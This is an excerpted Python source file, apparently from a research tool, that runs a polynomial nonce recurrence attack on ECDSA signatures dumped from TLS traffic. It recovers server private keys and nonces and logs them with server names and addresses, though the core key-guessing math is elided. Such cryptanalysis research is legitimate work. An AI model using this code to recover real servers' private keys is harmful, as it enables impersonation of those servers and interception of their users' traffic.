...
usedcurve = ecdsa.curves.NIST256p
...
def get_parser():
    parser = argparse.ArgumentParser(
        prog="ecdsa-tls-attack",
        description="Run the polynomial nonce recurrence attack on a TLS dataset."
    )
    parser.add_argument("--input", "-i", type=str, required=True,
                        help="Path to the input file. Must be a dump file in the format produced by ecdsa-dump-tls "
    ...
    with executor as ex:
        with open(input_path, "r") as f:
            for line in f:
                ...
                r, s, sig_val_hex, pubkey, src_addr, server_name, message, timestamp = fields
...
def process_batch(current_batch):
    ...
    for entry in current_batch:
        r, s, sig_val_hex, pubkey_hex, src_addr, server_name, message_hex, timestamp = entry

        msg = bytes.fromhex(message_hex)
        sig_val = bytes.fromhex(sig_val_hex)

        # hash the message and use the hash from now on
        h = hashlib.sha256()
        h.update(msg)
        h_bytes = h.digest()
    ...
    if d is None:
        ...
        return d, first_pubkey, server_name, src_addrs[0], batch_size, signatures, hashes, timestamps
...
def compute_nonces(d, signatures, hashes):
    rs = [get_sig_r(sig) for sig in signatures]
    ss = [get_sig_s(sig) for sig in signatures]
    ks = []
...
def process_result(result, output_path):
    if result[0] is not None:
        d, first_pubkey, server_name, first_src_addr, batch_size, signatures, hashes, timestamps = result
        ...
        with open(output_path, "a+") as fout:
            outline = f"{d};{first_pubkey};{server_name};{batch_size};{first_src_addr}"
...
def do_attack(signatures, hashes, pubkey_hex, n):
    ...
    for i in d_guesses:
        ...
        pubkey = PubKeyECDSA()
        pubkey.import_from_der(bytes.fromhex(pubkey_hex))

        public_numbers = pubkey.pubkey.public_numbers()
        x = public_numbers.x
        y = public_numbers.y
        try:
            curve = fastecdsa.curve.P256
            point = fastecdsa.keys.Point(x, y, curve=curve)
        except ValueError:
            # point not on specified curve
            print(f"[ERROR] coordinates x,y not on curve {curve}", file=sys.stderr)
            continue
